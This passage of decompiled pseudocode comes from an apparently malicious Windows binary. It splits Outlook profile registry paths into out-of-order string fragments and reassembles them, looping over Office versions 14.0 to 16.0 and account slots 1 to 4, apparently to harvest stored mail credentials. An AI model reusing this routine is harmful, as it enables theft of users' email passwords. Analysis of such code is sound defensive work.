fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000001\", 0x19);\n    var_4h = 0x50;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x51;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x52;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\14.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x53;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x54;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x55;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x56;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x57;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x58;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x59);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.004090e0(\"B88A00104B2A6676\\\\00000002\", 0x19);\n    var_4h = 0x5a;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    fcn.004090e0(\"look\\\\9375CFF0413111d3\", 0x15);\n    var_4h._0_1_ = 0x5b;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    fcn.004090e0(\"ook\\\\Profiles\\\\Out\", 0x10);\n    var_4h._0_1_ = 0x5c;\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    fcn.004090e0(\"ce\\\\14.0\\\\Outl\", 0xc);\n    var_4h._0_1_ = 0x5d;\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    fcn.004090e0(\"osoft\\\\Offi\", 10);\n    var_4h._0_1_ = 0x5e;\n    fcn.00409750(&var_134h);\n    var_4h._0_1_ = 0x5f;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x60;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x61;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x62;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 99);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    var_4h = 0xffffffff;\n    var_174h = 0xf;\n    var_178h = 0;\n    var_188h = var_188h & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000003\");\n    var_4h = 100;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x65;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x66;\n    fcn.00408f20(\"ce\\\\14.0\\\\Outl\");\n    var_4h._0_1_ = 0x67;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x68;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x69;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x6a;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x6b;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x6c;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x6d);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000004\");\n    var_4h = 0x6e;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x6f;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x70;\n    fcn.00408f20(\"ce\\\\14.0\\\\Outl\");\n    var_4h._0_1_ = 0x71;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x72;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x73;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x74;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x75;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x76;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x77);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000001\");\n    var_4h = 0x78;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x79;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x7a;\n    fcn.00408f20(\"ce\\\\15.0\\\\Outl\");\n    var_4h._0_1_ = 0x7b;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x7c;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x7d;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x7e;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x7f;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x80;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x81);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000002\");\n    var_4h = 0x82;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x83;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x84;\n    fcn.00408f20(\"ce\\\\15.0\\\\Outl\");\n    var_4h._0_1_ = 0x85;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x86;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x87;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x88;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x89;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x8a;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x8b);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000003\");\n    var_4h = 0x8c;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x8d;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x8e;\n    fcn.00408f20(\"ce\\\\15.0\\\\Outl\");\n    var_4h._0_1_ = 0x8f;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x90;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x91;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x92;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x93;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x94;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x95);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000004\");\n    var_4h = 0x96;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0x97;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0x98;\n    fcn.00408f20(\"ce\\\\15.0\\\\Outl\");\n    var_4h._0_1_ = 0x99;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0x9a;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0x9b;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0x9c;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0x9d;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0x9e;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0x9f);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\n    var_120h = 0xf;\n    var_124h = 0;\n    var_134h = var_134h & 0xffffff00;\n    if (0xf < var_13ch) {\n        fcn.0042d62b(var_150h);\n    }\n    var_13ch = 0xf;\n    var_140h = 0;\n    var_150h = var_150h & 0xffffff00;\n    if (0xf < var_158h) {\n        fcn.0042d62b(var_16ch);\n    }\n    var_4h = 0xffffffff;\n    var_158h = 0xf;\n    var_15ch = 0;\n    var_16ch = var_16ch & 0xffffff00;\n    if (0xf < var_174h) {\n        fcn.0042d62b(var_188h);\n    }\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000001\");\n    var_4h = 0xa0;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xa1;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0xa2;\n    fcn.00408f20(\"ce\\\\16.0\\\\Outl\");\n    var_4h._0_1_ = 0xa3;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0xa4;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xa5;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0xa6;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0xa7;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xa8;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0xa9);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    if (0xf < var_200h) {\n        fcn.0042d62b(var_214h);\n    }\n    var_200h = 0xf;\n    var_204h = 0;\n    var_214h = var_214h & 0xffffff00;\n    if (0xf < var_21ch) {\n        fcn.0042d62b(var_230h);\n    }\n    var_21ch = 0xf;\n    var_220h = 0;\n    var_230h = var_230h & 0xffffff00;\n    if (0xf < var_1ach) {\n        fcn.0042d62b(var_1c0h);\n    }\n    var_1ach = 0xf;\n    var_1b0h = 0;\n    var_1c0h = var_1c0h & 0xffffff00;\n    if (0xf < var_1e4h) {\n        fcn.0042d62b(var_1f8h);\n    }\n    var_1e4h = 0xf;\n    var_1e8h = 0;\n    var_1f8h = var_1f8h & 0xffffff00;\n    if (0xf < var_1c8h) {\n        fcn.0042d62b(var_1dch);\n    }\n    var_1c8h = 0xf;\n    var_1cch = 0;\n    var_1dch = var_1dch & 0xffffff00;\n    if (0xf < var_190h) {\n        fcn.0042d62b(var_1a4h);\n    }\n    var_190h = 0xf;\n    var_194h = 0;\n    var_1a4h = var_1a4h & 0xffffff00;\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000002\");\n    var_4h = 0xaa;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xab;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0xac;\n    fcn.00408f20(\"ce\\\\16.0\\\\Outl\");\n    var_4h._0_1_ = 0xad;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0xae;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xaf;\n    fcn.004097a0(&var_1f8h);\n    var_4h._0_1_ = 0xb0;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0xb1;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xb2;\n    puVar2 = fcn.004097a0(&var_214h);\n    var_4h = CONCAT31(var_4h._1_3_, 0xb3);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000003\");\n    var_4h = 0xb4;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xb5;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0xb6;\n    fcn.00408f20(\"ce\\\\16.0\\\\Outl\");\n    var_4h._0_1_ = 0xb7;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0xb8;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xb9;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0xba;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xbb;\n    fcn.004097a0(&var_214h);\n    var_4h._0_1_ = 0xbc;\n    puVar2 = fcn.004097a0(auStack592);\n    var_4h = CONCAT31(var_4h._1_3_, 0xbd);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000004\");\n    var_4h = 0xbe;\n    fcn.00408f20(\"look\\\\9375CFF0413111d3\");\n    var_4h._0_1_ = 0xbf;\n    fcn.00408f20(\"ook\\\\Profiles\\\\Out\");\n    var_4h._0_1_ = 0xc0;\n    fcn.00408f20(\"ce\\\\16.0\\\\Outl\");\n    var_4h._0_1_ = 0xc1;\n    uVar1 = fcn.00408f20(\"osoft\\\\Offi\");\n    var_4h._0_1_ = 0xc2;\n    fcn.00409750(uVar1);\n    var_4h._0_1_ = 0xc3;\n    fcn.004097a0(&var_1c0h);\n    var_4h._0_1_ = 0xc4;\n    fcn.004097a0(&var_230h);\n    var_4h._0_1_ = 0xc5;\n    fcn.004097a0(&var_214h);\n    var_4h._0_1_ = 0xc6;\n    puVar2 = fcn.004097a0(auStack592);\n    var_4h = CONCAT31(var_4h._1_3_, 199);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    fcn.004053b0(puVar2);\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    fcn.00408f80();\n    var_4h = 0xffffffff;\n    fcn.00408f80();\n    fcn.00408f20(\"B88A00104B2A6676\\\\00000001\");\n    var_4h = 